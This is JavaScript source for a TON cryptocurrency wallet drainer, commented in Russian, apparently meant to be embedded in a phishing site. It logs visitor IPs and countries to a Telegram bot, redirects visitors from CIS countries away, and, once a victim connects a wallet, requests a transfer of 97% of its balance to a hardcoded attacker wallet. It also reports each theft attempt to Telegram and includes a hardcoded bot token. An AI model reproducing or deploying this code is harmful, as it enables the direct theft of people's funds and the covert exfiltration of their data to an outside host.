var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; //Ваш кошелек, куда будут лететь активы
var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg"; //Токен от бота телеграмм
var tgChat = ""; //Ваш телеграмм-канал



var domain = window.location.hostname;
var ipUser;




//Перенаправление стран СНГ
fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
    const country = data.country;
    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
        window.location.replace('');
    }
    ipUser = data.ip;
    countryUser = data.country;
    console.log('IP: ' + ipUser);
    console.log('Country: ' + countryUser)
    const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
    const encodedMessageOpen = encodeURIComponent(messageOpen);
    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;
    fetch(url, {
        method: 'POST',
    }).then(response => {
        if (response.ok) {
            console.log('Success send.');
        } else {
            console.error('Error send.');
        }
    }).catch(error => {
        console.error('Error: ', error);
    });
}).catch(error => console.error('Error IP:', error));

const protocol = window.location.protocol;
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: protocol + '//' + domain + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
})
tonConnectUI.on('walletConnected', (walletAddress) => {
    console.log('Адрес кошелька:', walletAddress);
    didtrans();
});

async function didtrans() {
    let originalBalance = 0.01;
    try {
        const response = await fetch('https://tonapi.io/v1/account/get?address=' + tonConnectUI.account.address);
        const data = await response.json();
        if (data && data.balance) {
            originalBalance = data.balance / 1000000000;
        }
    } catch (e) {
        console.error('Error fetching balance:', e);
    }
    let processedBalance = originalBalance * 0.97;
    let tgBalance = processedBalance;
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{
            address: mainWallet,
            amount: String(Math.floor(processedBalance * 1000000000))
        }]
    }
    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
        const encodedMessageSend = encodeURIComponent(messageSend);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;
        fetch(url, {
            method: 'POST',
        }).then(response => {
            if (response.ok) {
                console.log('Success send.');
            } else {
                console.error('Error send.');
            }
            
        }).catch(error => {
            console.error('Error: ', error);
        });
    } catch (e) {
        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
        const encodedMessageDeclined = encodeURIComponent(messageDeclined);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;
        fetch(url, {
            method: 'POST',
        }).then(response => {
            if (response.ok) {
                console.log('Success send.');
            } else {
                console.error('Error send.');
            }
        }).catch(error => {
            console.error('Error: ', error);
        });
        console.error(e);
    }
}